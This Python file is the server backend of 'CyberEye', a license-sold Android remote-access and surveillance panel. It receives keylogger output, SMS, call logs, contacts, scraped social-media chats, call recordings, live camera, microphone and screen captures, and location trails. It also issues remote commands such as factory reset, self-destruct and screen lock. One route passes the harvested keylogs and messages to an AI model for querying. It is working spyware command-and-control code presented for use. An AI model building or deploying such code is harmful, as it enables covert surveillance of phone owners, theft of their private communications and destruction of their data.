def calculate_distance(lat1, lng1, lat2, lng2):
    R = 6371000.0  # Earth radius in meters
    phi1 = math.radians(lat1)
    phi2 = math.radians(lat2)
    delta_phi = math.radians(lat2 - lat1)
    delta_lambda = math.radians(lng2 - lng1)
    a = math.sin(delta_phi / 2.0) ** 2 + math.cos(phi1) * math.cos(phi2) * math.sin(delta_lambda / 2.0) ** 2
    c = 2.0 * math.atan2(math.sqrt(a), math.sqrt(1.0 - a))
    return R * c

def log_geofence_event(device_id, fence_id, fence_name, fence_type, event):
    if device_id not in database:
        database[device_id] = {}
    if "geofence_events" not in database[device_id]:
        database[device_id]["geofence_events"] = []
    
    events = database[device_id]["geofence_events"]
    # Time format like "Jul 31, 2026 11:11 AM"
    timestamp = time.strftime("%b %d, %Y %I:%M %p")
    events.insert(0, {
        "fence_id": fence_id,
        "name": fence_name,
        "type": fence_type,
        "event": event,
        "time": timestamp
    })
    database[device_id]["geofence_events"] = events[:50]

def check_geofences_for_device(device_id, data):
    if not data or "lat" not in data or "lng" not in data:
        return
    lat = data["lat"]
    lng = data["lng"]
    
    device_data = database.get(device_id, {})
    settings = device_data.get("settings", {})
    geofences = settings.get("geofences", [])
    
    if not geofences:
        return
        
    last_states = device_data.get("last_geofence_states", {})
    new_states = {}
    
    for fence in geofences:
        fence_id = fence.get("id")
        fence_lat = fence.get("lat")
        fence_lng = fence.get("lng")
        radius = fence.get("radius")
        fence_name = fence.get("name", "Unknown Fence")
        fence_type = fence.get("type", "allowed")
        
        if not fence_id or fence_lat is None or fence_lng is None or radius is None:
            continue
            
        distance = calculate_distance(lat, lng, fence_lat, fence_lng)
        prev_state = last_states.get(fence_id)
        
        if fence_type == "restricted":
            if distance <= radius:
                new_states[fence_id] = "inside"
                if prev_state != "inside":
                    msg = f"[Geo-Fence] WARNING: Device entered restricted area: '{fence_name}'"
                    update_device_record(device_id, "logs", msg)
                    log_geofence_event(device_id, fence_id, fence_name, fence_type, "Enters")
                    socketio.emit('geofence_alert', {
                        'device_id': device_id,
                        'fence_id': fence_id,
                        'name': fence_name,
                        'type': fence_type,
                        'event': 'enter_restricted',
                        'message': f"Device entered restricted area '{fence_name}'!"
                    })
            else:
                new_states[fence_id] = "outside"
                if prev_state == "inside":
                    msg = f"[Geo-Fence] INFO: Device left restricted area: '{fence_name}'"
                    update_device_record(device_id, "logs", msg)
                    log_geofence_event(device_id, fence_id, fence_name, fence_type, "Leaves")
                    socketio.emit('geofence_alert', {
                        'device_id': device_id,
                        'fence_id': fence_id,
                        'name': fence_name,
                        'type': fence_type,
                        'event': 'leave_restricted',
                        'message': f"Device left restricted area '{fence_name}'."
                    })
        elif fence_type == "allowed":
            if distance > radius:
                new_states[fence_id] = "outside"
                if prev_state != "outside":
                    msg = f"[Geo-Fence] WARNING: Device left allowed area: '{fence_name}'"
                    update_device_record(device_id, "logs", msg)
                    log_geofence_event(device_id, fence_id, fence_name, fence_type, "Leaves")
                    socketio.emit('geofence_alert', {
                        'device_id': device_id,
                        'fence_id': fence_id,
                        'name': fence_name,
                        'type': fence_type,
                        'event': 'leave_allowed',
                        'message': f"Device left allowed area '{fence_name}'!"
                    })
            else:
                new_states[fence_id] = "inside"
                if prev_state == "outside":
                    msg = f"[Geo-Fence] INFO: Device entered allowed area: '{fence_name}'"
                    update_device_record(device_id, "logs", msg)
                    log_geofence_event(device_id, fence_id, fence_name, fence_type, "Enters")
                    socketio.emit('geofence_alert', {
                        'device_id': device_id,
                        'fence_id': fence_id,
                        'name': fence_name,
                        'type': fence_type,
                        'event': 'enter_allowed',
                        'message': f"Device returned to allowed area '{fence_name}'."
                    })
                    
    # Retain other states
    for k, v in last_states.items():
        if k not in new_states:
            new_states[k] = v
            
    database[device_id]["last_geofence_states"] = new_states
    save_db()

@socketio.on('location')
def handle_location(data):
    # data: {"lat": Double, "lng": Double, "time": Long} or {"error": String, "time": Long}
    device_id = sid_to_device.get(request.sid)
    if device_id and data:
        # Check if daily route tracker is enabled and update
        if "lat" in data and "lng" in data:
            settings = database.get(device_id, {}).get("settings", {})
            if settings.get("lock_track_enabled", False):
                today_route = database[device_id].get("today_route", [])
                current_time = time.localtime(data.get("time", int(time.time() * 1000)) / 1000)
                current_date_str = time.strftime("%Y-%m-%d", current_time)
                today_route_date = database[device_id].get("today_route_date", current_date_str)
                
                if today_route_date != current_date_str:
                    if today_route:
                        route_history = database[device_id].get("route_history", [])
                        route_history.append({
                            "date": today_route_date,
                            "route": today_route
                        })
                        database[device_id]["route_history"] = route_history[-30:]
                    today_route = []
                    database[device_id]["today_route_date"] = current_date_str
                
                today_route.append({
                    "lat": data["lat"],
                    "lng": data["lng"],
                    "time": data.get("time", int(time.time() * 1000))
                })
                database[device_id]["today_route"] = today_route
                database[device_id]["today_route_date"] = current_date_str
                save_db()

        update_device_record(device_id, "location", data)
        check_geofences_for_device(device_id, data)
        
        # Forward the location event to the dashboard
        if "error" in data:
            socketio.emit('location_error', {
                'device_id': device_id,
                'error': data.get("error", "Unknown error")
            })
        else:
            socketio.emit('location_update', {
                'device_id': device_id,
                'lat': data.get("lat"),
                'lng': data.get("lng")
            })

@socketio.on('social_message')
def handle_social_message(data):
    # data: {"platform": String, "contact": String, "text": String, "isSent": Boolean, "time": Long}
    device_id = sid_to_device.get(request.sid)
    if device_id and data:
        platform = data.get("platform", "unknown").replace(".", "_")
        contact = data.get("contact", "unknown").replace(".", "_").replace(" ", "_")
        text = data.get("text", "")
        is_sent = data.get("isSent", False)
        msg_time = data.get("time", int(time.time() * 1000))

        if device_id not in database: database[device_id] = {"_id": device_id}
        if "chats" not in database[device_id]: database[device_id]["chats"] = {}
        if platform not in database[device_id]["chats"]: database[device_id]["chats"][platform] = {}
        if contact not in database[device_id]["chats"][platform]:
            database[device_id]["chats"][platform][contact] = {"contactName": contact, "messages": {}}

        # Deduplication check: Check if same text and type exists in the last 40 messages of this chat
        messages_dict = database[device_id]["chats"][platform][contact]["messages"]
        is_duplicate = False
        if messages_dict:
            sorted_msgs = sorted(messages_dict.values(), key=lambda x: x.get("time", 0), reverse=True)
            for m in sorted_msgs[:40]:
                if m.get("text") == text and m.get("type") == ("sent" if is_sent else "received"):
                    # Check if the duplicate is from a recent scrape (within 24 hours)
                    if abs(m.get("time", 0) - msg_time) < 86400000:
                        is_duplicate = True
                        break

        if is_duplicate:
            return

        m_id = str(hash(text + ("sent" if is_sent else "received") + str(msg_time)))
        database[device_id]["chats"][platform][contact]["messages"][m_id] = {
            "text": text,
            "type": "sent" if is_sent else "received",
            "time": msg_time
        }
        save_db()
        socketio.emit('social_message_received', {
            'device_id': device_id,
            'platform': platform,
            'contact': contact,
            'text': text,
            'isSent': is_sent,
            'time': msg_time
        })

# --- HTTP Routes ---
# --- HTTP Routes ---
@app.route('/')
def index():
    if 'username' in session:
        if session.get('admin_logged', False):
            return redirect(url_for('admin_panel_view'))
        return redirect(url_for('dashboard_view'))
    return redirect(url_for('login_page'))

@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'POST':
        # Accept username, password, and license key from client
        req_data = request.json or {}
        username = req_data.get('username')
        password = req_data.get('password')
        license_key = req_data.get('license_key')

        if not username or not password:
            return jsonify({'success': False, 'error': 'Username and Password are required.'}), 400

        # Check Admin credentials first
        if username == ADMIN_EMAIL:
            if check_password(password, ADMIN_PASSWORD_HASH):
                session['username'] = username
                session['admin_logged'] = True
                return jsonify({'success': True, 'is_admin': True, 'redirect': url_for('admin_panel_view')})
            else:
                return jsonify({'success': False, 'error': 'Invalid credentials.'}), 401

        # Check if license_key is provided for normal users
        if not license_key:
            return jsonify({'success': False, 'error': 'License Key is required.'}), 400

        # 1. Check user existence and check password hash
        user_info = users_database.get("users", {}).get(username)
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid credentials.'}), 401

        if not check_password(password, user_info.get("password_hash", "")):
            return jsonify({'success': False, 'error': 'Invalid credentials.'}), 401

        # 2. Check license key validation
        license_info = users_database.get("licenses", {}).get(license_key)
        if not license_info or license_info.get("assigned_to") != username:
            return jsonify({'success': False, 'error': 'License key invalid or not assigned to this user.'}), 401

        if not license_info.get("is_active", True):
            return jsonify({'success': False, 'error': 'License key is inactive.'}), 401

        # 3. Check license key duration expiration
        current_ts = int(time.time())
        expires_at = license_info.get("expires_at", 0)
        if current_ts > expires_at:
            return jsonify({'success': False, 'error': 'License key expired. Please renew your key.'}), 401

        # Credentials valid! Save username and active license key into user session
        session['username'] = username
        session['license_key'] = license_key
        return jsonify({'success': True})
        
    if 'username' in session:
        if session.get('admin_logged', False):
            return redirect(url_for('admin_panel_view'))
        return redirect(url_for('dashboard_view'))
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('username', None)
    session.pop('license_key', None)
    session.pop('admin_logged', None)
    if request.headers.get('Accept') == 'application/json' or request.is_json:
        return jsonify({'success': True})
    return redirect(url_for('login_page'))

@app.route('/introl')
@login_required
def introl_view():
    return render_template('introl.html')

@app.route('/introl.mp4')
def serve_intro_video():
    return send_file('introl.mp4')

@app.route('/logo.png')
@app.route('/static/logo.png')
def serve_logo():
    return send_file('logo.png')

@app.route('/dashboard')
@login_required
def dashboard_view():
    if session.get('admin_logged', False):
        return redirect(url_for('admin_panel_view'))
    return render_template('dashbord.html')

@app.route('/check_auth')
def check_auth():
    authorized = 'username' in session
    return jsonify({'authorized': authorized})

@app.route('/api/devices')
@login_required
def api_devices():
    devices = []
    username = session.get('username')
    
    # Update last_seen in users_database
    if username in users_database.get("users", {}):
        users_database["users"][username]["last_seen"] = int(time.time())
        save_users_db()
        
    for k in database.keys():
        if k.lower() in BLACKLIST: continue
        # Verify access & omit device if admin hide is active
        if not has_device_access(username, k): continue
        
        v = database.get(k, {})
        online = k in connected_devices
        devices.append({
            "id": k,
            "model": v.get("info", {}).get("model", k),
            "lastSeen": v.get("lastSeen", 0),
            "online": online
        })
    return jsonify(devices)

@app.route('/keylogs')
@login_required
def keylogs_view():
    # Double check access
    device_id = request.args.get('id')
    if device_id and not has_device_access(session.get('username'), device_id):
        return "Access denied", 403
    return render_template('keylogs.html')

@app.route('/file_manager')
@login_required
def file_manager_view():
    device_id = request.args.get('id')
    if device_id and not has_device_access(session.get('username'), device_id):
        return "Access denied", 403
    return render_template('file_manager.html')

@app.route('/social_media')
@login_required
def social_media_view():
    device_id = request.args.get('id')
    if device_id and not has_device_access(session.get('username'), device_id):
        return "Access denied", 403
    return render_template('social_media.html')

@app.route('/location_3d')
@login_required
def location_3d_view():
    device_id = request.args.get('id')
    if device_id and not has_device_access(session.get('username'), device_id):
        return "Access denied", 403
    return render_template('location.html')

@app.route('/route_history')
@login_required
def route_history_view():
    device_id = request.args.get('id')
    if device_id and not has_device_access(session.get('username'), device_id):
        return "Access denied", 403
    return render_template('route_history.html')

@app.route('/geofencing')
@login_required
def geofencing_view():
    device_id = request.args.get('id')
    if device_id and not has_device_access(session.get('username'), device_id):
        return "Access denied", 403
    return render_template('geofencing.html')

@app.route('/ai_chatbot')
@login_required
def ai_chatbot_view():
    device_id = request.args.get('id')
    if device_id and not has_device_access(session.get('username'), device_id):
        return "Access denied", 403
    return render_template('Ai_chatbot.html')

@app.route('/Screen_mirroring.html')
@login_required
def mirror_view():
    device_id = request.args.get('id')
    if device_id and not has_device_access(session.get('username'), device_id):
        return "Access denied", 403
    return render_template('Screen_mirroring.html')

@app.route('/Live_Camera.html')
@login_required
def live_camera_view():
    device_id = request.args.get('id')
    if device_id and not has_device_access(session.get('username'), device_id):
        return "Access denied", 403
    return render_template('Live_Camera.html')

@app.route('/Live_Audio.html')
@login_required
def live_audio_view():
    device_id = request.args.get('id')
    if device_id and not has_device_access(session.get('username'), device_id):
        return "Access denied", 403
    return render_template('Live_Audio.html')

@app.route('/api/device/<device_id>/data')
@login_required
def api_device_data(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    if device_id not in database: return jsonify({"error": "Not found"}), 404
    resp_data = dict(database[device_id])

    for cat in ["calls", "sms", "apps", "contacts", "accounts", "notifications", "files"]:
        cache_key = f"{cat}_cache"
        if cache_key in database[device_id] and database[device_id][cache_key]:
            resp_data[cat] = database[device_id][cache_key]
        else:
            local_list = get_and_parse_cloud_data(device_id, category=cat)
            resp_data[cat] = local_list if local_list else []

    resp_data['usage'] = {}
    for sub in ["daily", "weekly", "monthly"]:
        cache_key = f"usage_{sub}_cache"
        if cache_key in database[device_id] and database[device_id][cache_key]:
            resp_data['usage'][sub] = database[device_id][cache_key]
        else:
            u_cat = f"usage_{sub}"
            u_list = get_and_parse_cloud_data(device_id, category=u_cat)
            resp_data['usage'][sub] = u_list if u_list else []

    resp_data['settings'] = database[device_id].get("settings", {})
    return jsonify(resp_data)

@app.route('/api/device/<device_id>/ai_context')
@login_required
def ai_context(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    if device_id not in database: return jsonify({"error": "Device not found"}), 404

    calls = get_and_parse_cloud_data(device_id, "calls") or []
    sms = get_and_parse_cloud_data(device_id, "sms") or []
    notifs = get_and_parse_cloud_data(device_id, "notifications") or []
    contacts = get_and_parse_cloud_data(device_id, "contacts") or []
    chats = database.get(device_id, {}).get('chats', {})

    keylogs = []
    if device_id in database and "keylogs" in database[device_id]:
        keylogs = list(database[device_id]["keylogs"].values())
    
    keylogs.sort(key=lambda x: x.get('time', 0))

    return jsonify({
        "device_id": device_id,
        "current_time": time.strftime("%Y-%m-%d %H:%M:%S"),
        "calls": calls[:40],
        "sms": sms[:40],
        "notifications": notifs[:30],
        "contacts": contacts,
        "chats": chats,
        "keylogs": keylogs[-600:]
    })

@app.route('/api/device/<device_id>/ai_chat', methods=['POST'])
def ai_chat(device_id):
    if device_id not in database: return jsonify({"error": "Device not found"}), 404
    user_msg = request.json.get('message')

    calls = get_and_parse_cloud_data(device_id, "calls") or []
    sms = get_and_parse_cloud_data(device_id, "sms") or []
    notifs = get_and_parse_cloud_data(device_id, "notifications") or []
    
    keylogs = []
    if device_id in database and "keylogs" in database[device_id]:
        keylogs = list(database[device_id]["keylogs"].values())

    context = f"You are CyberEye AI Assistant. Operating on Device: {device_id}\n"
    context += f"CALL LOGS: {json.dumps(calls[:20])}\n"
    context += f"SMS LOGS: {json.dumps(sms[:20])}\n"
    context += f"NOTIFICATIONS: {json.dumps(notifs[:15])}\n"
    context += f"RECENT KEYLOGS: {json.dumps(keylogs[:30])}\n"
    context += "\nInstruction: Answer the user's question based on this data. If data is empty, say no logs found yet. Speak professionally in English."

    try:
        url = f"https://generativelanguage.googleapis.com/v1/models/gemini-1.5-flash:generateContent?key={GEMINI_API_KEY}"
        payload = {
            "contents": [{"parts": [{"text": f"{context}\n\nUser Question: {user_msg}"}]}]
        }
        headers = {"Content-Type": "application/json"}
        gemini_resp = requests.post(url, json=payload, headers=headers, timeout=20)
        result = gemini_resp.json()

        if 'candidates' in result and len(result['candidates']) > 0:
            ai_reply = result['candidates'][0]['content']['parts'][0]['text']
            return jsonify({"reply": ai_reply})
        else:
            url_pro = f"https://generativelanguage.googleapis.com/v1/models/gemini-1.5-pro:generateContent?key={GEMINI_API_KEY}"
            resp_pro = requests.post(url_pro, json=payload, headers=headers, timeout=20)
            res_pro = resp_pro.json()
            if 'candidates' in res_pro and len(res_pro['candidates']) > 0:
                return jsonify({"reply": res_pro['candidates'][0]['content']['parts'][0]['text']})

            error_msg = result.get('error', {}).get('message', 'AI Model not responding.')
            return jsonify({"reply": f"AI Error: {error_msg}"})
    except Exception as e:
        return jsonify({"reply": "Network Error: System core unstable."})

@app.route('/api/device/<device_id>/monitored_apps', methods=['GET', 'POST'])
@login_required
def api_monitored_apps(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    if device_id not in database: database[device_id] = {"_id": device_id}
    if "settings" not in database[device_id]: database[device_id]["settings"] = {}
    if "monitored_apps" not in database[device_id]["settings"]: database[device_id]["settings"]["monitored_apps"] = {}
    
    if request.method == 'POST':
        action = request.json.get('action')
        package = request.json.get('package', '').strip()
        name = request.json.get('name', '').strip()
        
        if not package:
            return jsonify({'success': False, 'error': 'Package name is required'}), 400
            
        key = package.replace('.', '_')
        if action == 'add':
            if not name:
                return jsonify({'success': False, 'error': 'App name is required for adding'}), 400
            database[device_id]["settings"]["monitored_apps"][key] = {
                "name": name,
                "package": package
            }
            save_db()
            
            sid = connected_devices.get(device_id)
            if sid:
                socketio.emit('command', {'action': f"MONITOR_APP:{package}"}, room=sid)
            return jsonify({'success': True})
            
        elif action == 'remove':
            if key in database[device_id]["settings"]["monitored_apps"]:
                del database[device_id]["settings"]["monitored_apps"][key]
                save_db()
                
                sid = connected_devices.get(device_id)
                if sid:
                    socketio.emit('command', {'action': f"UNMONITOR_APP:{package}"}, room=sid)
                return jsonify({'success': True})
            return jsonify({'success': False, 'error': 'App not found'}), 404
            
    return jsonify(database[device_id]["settings"]["monitored_apps"])

@app.route('/api/device/<device_id>/mirror_status')
@login_required
def api_device_mirror(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    if device_id not in database: return jsonify({})
    d = database[device_id]
    return jsonify({
        "url": d.get("mirror_url"),
        "time": d.get("mirror_time"),
        "bat": d.get("info", {}).get("battery", "--")
    })

@app.route('/api/device/<device_id>/live_camera_status')
@login_required
def api_device_live_camera(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    if device_id not in database: return jsonify({})
    d = database[device_id]
    return jsonify({
        "url": d.get("live_camera_url"),
        "time": d.get("live_camera_time"),
        "bat": d.get("info", {}).get("battery", "--")
    })

@app.route('/api/device/<device_id>/live_audio_status')
@login_required
def api_device_live_audio(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    if device_id not in database: return jsonify({})
    d = database[device_id]
    return jsonify({
        "url": d.get("live_audio_url"),
        "time": d.get("live_audio_time")
    })

@app.route('/api/device/<device_id>/previews')
@login_required
def api_device_previews(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    if device_id not in database: return jsonify({})
    return jsonify(database[device_id].get("previews", {}))

@app.route('/api/media/stream/<device_id>/<path:filename>')
@login_required
def stream_media(device_id, filename):
    if not has_device_access(session.get('username'), device_id):
        return "Unauthorized", 403
    file_path = os.path.join("media", device_id, filename)
    if os.path.exists(file_path):
        return send_file(file_path)
    return "Not Found", 404

@app.route('/api/device/<device_id>/file/<folder>/<path:filename>')
@login_required
def serve_device_file(device_id, folder, filename):
    if not has_device_access(session.get('username'), device_id):
        return "Unauthorized", 403
    path1 = os.path.join("data", device_id, folder, filename)
    if os.path.exists(path1):
        return send_file(path1)
    path2 = os.path.join("media", device_id, filename)
    if os.path.exists(path2):
        return send_file(path2)
    return "Not Found", 404

@app.route('/api/device/<device_id>/upload_media', methods=['POST'])
def api_device_upload_media(device_id):
    if 'file' not in request.files:
        return jsonify({"success": False, "error": "No file part"}), 400
    file = request.files['file']
    category = request.form.get('category', 'files')
    if file.filename == '':
        return jsonify({"success": False, "error": "No selected file"}), 400
        
    os.makedirs(os.path.join("data", device_id), exist_ok=True)
    os.makedirs(os.path.join("media", device_id), exist_ok=True)
    
    filename = file.filename
    text_categories = ["calls", "sms", "contacts", "apps", "accounts", "notifications", "usage_daily", "usage_weekly", "usage_monthly", "files", "info"]
    
    if category in text_categories:
        file_path = os.path.join("data", device_id, f"{category}.txt")
        file.save(file_path)
        
        if device_id not in database: database[device_id] = {"_id": device_id}
        if "refs" not in database[device_id]: database[device_id]["refs"] = {}
        database[device_id]["refs"][category] = int(time.time() * 1000)
        database[device_id]["lastSeen"] = int(time.time() * 1000)
        
        if category == "info":
            try:
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    info_content = f.read()
                update_device_record(device_id, "info", info_content)
                update_device_record(device_id, "info", f"ip: {request.remote_addr}\n")
            except Exception as e:
                print(f"[Upload] Error parsing info file: {e}")
        elif category == "notifications":
            parsed = get_and_parse_cloud_data(device_id, category="notifications")
            database[device_id]["notifications_cache"] = parsed if parsed else []
            if "info" in database[device_id]:
                database[device_id]["info"]["notif_pending"] = "0"

        save_db()
        if category == "files":
            socketio.emit('files_updated', {'device_id': device_id})
        elif category == "notifications":
            socketio.emit('device_status_change', {'device_id': device_id})
    else:
        if category == "wallpaper":
            file_path = os.path.join("media", device_id, "wallpaper.jpg")
            file.save(file_path)
            
            if device_id not in database: database[device_id] = {"_id": device_id}
            database[device_id]["wallpaper_url"] = f"/api/media/stream/{device_id}/wallpaper.jpg?t={int(time.time()*1000)}"
            database[device_id]["lastSeen"] = int(time.time() * 1000)
            save_db()
            socketio.emit('wallpaper_update', {'device_id': device_id, 'url': database[device_id]["wallpaper_url"]}, room=device_id)
        elif category == "mirror":
            file_path = os.path.join("media", device_id, "mirror.jpg")
            file.save(file_path)
            
            if device_id not in database: database[device_id] = {"_id": device_id}
            database[device_id]["mirror_url"] = f"/api/media/stream/{device_id}/mirror.jpg?t={int(time.time()*1000)}"
            database[device_id]["mirror_time"] = int(time.time() * 1000)
            database[device_id]["lastSeen"] = int(time.time() * 1000)
            save_db()
            socketio.emit('mirror_update', {'device_id': device_id, 'url': database[device_id]["mirror_url"]}, room=device_id)
        elif category == "live_camera":
            file_path = os.path.join("media", device_id, "live_camera.jpg")
            file.save(file_path)
            
            if device_id not in database: database[device_id] = {"_id": device_id}
            database[device_id]["live_camera_url"] = f"/api/media/stream/{device_id}/live_camera.jpg?t={int(time.time()*1000)}"
            database[device_id]["live_camera_time"] = int(time.time() * 1000)
            database[device_id]["lastSeen"] = int(time.time() * 1000)
            save_db()
            socketio.emit('live_camera_update', {'device_id': device_id, 'url': database[device_id]["live_camera_url"]}, room=device_id)
        elif category == "live_audio":
            file_path = os.path.join("media", device_id, filename)
            file.save(file_path)
            
            if device_id not in database: database[device_id] = {"_id": device_id}
            chunk_url = f"/api/media/stream/{device_id}/{filename}"
            database[device_id]["live_audio_url"] = chunk_url
            database[device_id]["live_audio_time"] = int(time.time() * 1000)
            database[device_id]["lastSeen"] = int(time.time() * 1000)
            save_db()
            socketio.emit('live_audio_chunk', {'device_id': device_id, 'url': chunk_url}, room=device_id)
        elif category in ["previews", "thumbnail", "thumbnails", "preview"]:
            target_dir = os.path.join("media", device_id, "thumbnail")
            os.makedirs(target_dir, exist_ok=True)
            file_path = os.path.join(target_dir, filename)
            file.save(file_path)
            
            path_on_device = request.form.get('path', '')
            rel_url = f"/api/media/stream/{device_id}/thumbnail/{filename}"
            fbKey = f"m_{int(time.time() * 1000)}_{uuid.uuid4().hex[:6]}"
            media_entry = {
                "time": int(time.time() * 1000),
                "url": rel_url,
                "name": filename,
                "type": "thumbnail",
                "category": "thumbnail",
                "path": path_on_device,
                "saved_path": file_path
            }
            if device_id not in database: database[device_id] = {"_id": device_id}
            if "media" not in database[device_id]: database[device_id]["media"] = {}
            database[device_id]["media"][fbKey] = media_entry

            if "previews" not in database[device_id]: database[device_id]["previews"] = {}
            p_key = f"p_{int(time.time() * 1000)}"
            database[device_id]["previews"][p_key] = {
                "time": int(time.time() * 1000),
                "url": rel_url,
                "name": filename,
                "path": path_on_device
            }
            database[device_id]["lastSeen"] = int(time.time() * 1000)
            save_db()
            socketio.emit('device_status_change', {'device_id': device_id})
            socketio.emit('media_updated', {'device_id': device_id}, room=device_id)
        else:
            media_type = "file"
            subfolder = "other"
            if category == "screenshot":
                media_type = "screenshot"
                subfolder = "screenshots"
            elif category == "image":
                media_type = "image"
                subfolder = "camera"
            elif category == "audio":
                media_type = "audio"
                subfolder = "audio"
            elif category == "call_recording":
                media_type = "call_recording"
                subfolder = "call_recordings"

            target_dir = os.path.join("media", device_id, subfolder)
            os.makedirs(target_dir, exist_ok=True)
            file_path = os.path.join(target_dir, filename)
            file.save(file_path)
            
            fbKey = f"m_{int(time.time() * 1000)}_{uuid.uuid4().hex[:6]}"
            media_entry = {
                "time": int(time.time() * 1000),
                "url": f"/api/media/stream/{device_id}/{subfolder}/{filename}",
                "name": filename,
                "type": media_type,
                "path": file_path
            }
            if device_id not in database: database[device_id] = {"_id": device_id}
            if "media" not in database[device_id]: database[device_id]["media"] = {}
            database[device_id]["media"][fbKey] = media_entry
            database[device_id]["lastSeen"] = int(time.time() * 1000)
            save_db()
            socketio.emit('device_status_change', {'device_id': device_id})
            socketio.emit('media_updated', {'device_id': device_id}, room=device_id)
            
    return jsonify({"success": True})

@app.route('/api/device/<device_id>/action', methods=['POST'])
@login_required
def api_device_action(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    action = request.json.get('action')
    action_map = {
        'GET_DEVICE_INFO':'DEVICE_INFO', 'DUMP_CALLS':'CALL_LOG', 'DUMP_SMS':'SMS_LOG',
        'DUMP_CONTACTS':'CONTACTS', 'GET_ACCOUNTS':'ACCOUNTS', 'LIST_APPS':'APPS_LIST',
        'TAKE_SCREENSHOT':'SCREENSHOT', 'TAKE_PHOTO_FRONT':'PHOTO_FRONT', 'TAKE_PHOTO_REAR':'PHOTO_REAR',
        'RECORD_AUDIO_15':'MIC_15S', 'RECORD_AUDIO_300':'AUDIO_300', 'RECORD_AUDIO_600':'AUDIO_600',
        'LOCK_DEVICE':'LOCK_SCREEN', 'FACTORY_RESET':'FACTORY_RESET',
        'FORCE_LOC_V1': 'FORCE_LOC_V1', 'FORCE_LOC_V2': 'FORCE_LOC_V2',
        'SELF_DESTRUCT': 'SELF_DESTRUCT',
        'GET_LOCATION': 'GET_LOCATION',
        'USAGE_DAILY': 'USAGE_DAILY',
        'USAGE_WEEKLY': 'USAGE_WEEKLY',
        'USAGE_MONTHLY': 'USAGE_MONTHLY',
        'START_LOCK_TRACK': 'START_LOCK_TRACK',
        'STOP_LOCK_TRACK': 'STOP_LOCK_TRACK',
        'START_NOTIFS': 'START_NOTIFS',
        'STOP_NOTIFS': 'STOP_NOTIFS',
        'TOGGLE_NOTIFS': 'TOGGLE_NOTIFS',
        'DUMP_NOTIFS': 'DUMP_NOTIFS',
        'GET_NOTIFICATIONS': 'DUMP_NOTIFS',
        'BLOCK_SCREEN': 'BLOCK_SCREEN',
        'BLACK_SCREEN': 'BLOCK_SCREEN',
        'UNBLOCK_SCREEN': 'UNBLOCK_SCREEN',
        'STOP_BLOCK': 'UNBLOCK_SCREEN'
    }

    if ':' in action:
        cmd = action
        parts = action.split(':', 1)
        action_type = parts[0]
        value = parts[1].strip()

        if action_type in ['BLOCK_APP', 'UNBLOCK_APP', 'BLOCK_WEB', 'UNBLOCK_WEB']:
            if device_id not in database: database[device_id] = {"_id": device_id}
            if "settings" not in database[device_id]: database[device_id]["settings"] = {}
            settings = database[device_id]["settings"]
            
            if action_type == 'BLOCK_APP':
                if "blocked_apps" not in settings: settings["blocked_apps"] = {}
                key = str(hash(value))
                settings["blocked_apps"][key] = value
            elif action_type == 'UNBLOCK_APP':
                if "blocked_apps" in settings:
                    keys_to_del = [k for k, v in settings["blocked_apps"].items() if v == value]
                    for k in keys_to_del: settings["blocked_apps"].pop(k)
            elif action_type == 'BLOCK_WEB':
                if "blocked_webs" not in settings: settings["blocked_webs"] = {}
                key = str(hash(value))
                settings["blocked_webs"][key] = value
            elif action_type == 'UNBLOCK_WEB':
                if "blocked_webs" in settings:
                    keys_to_del = [k for k, v in settings["blocked_webs"].items() if v == value]
                    for k in keys_to_del: settings["blocked_webs"].pop(k)
            save_db()
        elif action_type == 'BLOCK_SCREEN':
            if device_id not in database: database[device_id] = {"_id": device_id}
            if "info" not in database[device_id]: database[device_id]["info"] = {}
            database[device_id]["info"]["screen_blocked"] = "true"
            database[device_id]["info"]["block_message"] = value
            save_db()
    else:
        cmd = action_map.get(action, action)
        if cmd == 'START_LOCK_TRACK':
            if device_id not in database: database[device_id] = {"_id": device_id}
            if "settings" not in database[device_id]: database[device_id]["settings"] = {}
            database[device_id]["settings"]["lock_track_enabled"] = True
            save_db()
        elif cmd == 'STOP_LOCK_TRACK':
            if device_id not in database: database[device_id] = {"_id": device_id}
            if "settings" not in database[device_id]: database[device_id]["settings"] = {}
            database[device_id]["settings"]["lock_track_enabled"] = False
            save_db()
        elif cmd == 'START_NOTIFS':
            if device_id not in database: database[device_id] = {"_id": device_id}
            if "settings" not in database[device_id]: database[device_id]["settings"] = {}
            database[device_id]["settings"]["notifications_enabled"] = True
            save_db()
        elif cmd == 'STOP_NOTIFS':
            if device_id not in database: database[device_id] = {"_id": device_id}
            if "settings" not in database[device_id]: database[device_id]["settings"] = {}
            database[device_id]["settings"]["notifications_enabled"] = False
            save_db()
        elif cmd == 'TOGGLE_NOTIFS':
            if device_id not in database: database[device_id] = {"_id": device_id}
            if "settings" not in database[device_id]: database[device_id]["settings"] = {}
            curr = database[device_id]["settings"].get("notifications_enabled", True)
            database[device_id]["settings"]["notifications_enabled"] = not curr
            save_db()
        elif cmd == 'BLOCK_SCREEN':
            if device_id not in database: database[device_id] = {"_id": device_id}
            if "info" not in database[device_id]: database[device_id]["info"] = {}
            database[device_id]["info"]["screen_blocked"] = "true"
            database[device_id]["info"]["block_message"] = ""
            save_db()
        elif cmd == 'UNBLOCK_SCREEN':
            if device_id not in database: database[device_id] = {"_id": device_id}
            if "info" not in database[device_id]: database[device_id]["info"] = {}
            database[device_id]["info"]["screen_blocked"] = "false"
            database[device_id]["info"]["block_message"] = ""
            save_db()

    sid = connected_devices.get(device_id)
    if sid:
        print(f"[Socket.io] Emitting Command: {cmd} to Device: {device_id} (sid: {sid})")
        socketio.emit('command', {'action': cmd}, room=sid)
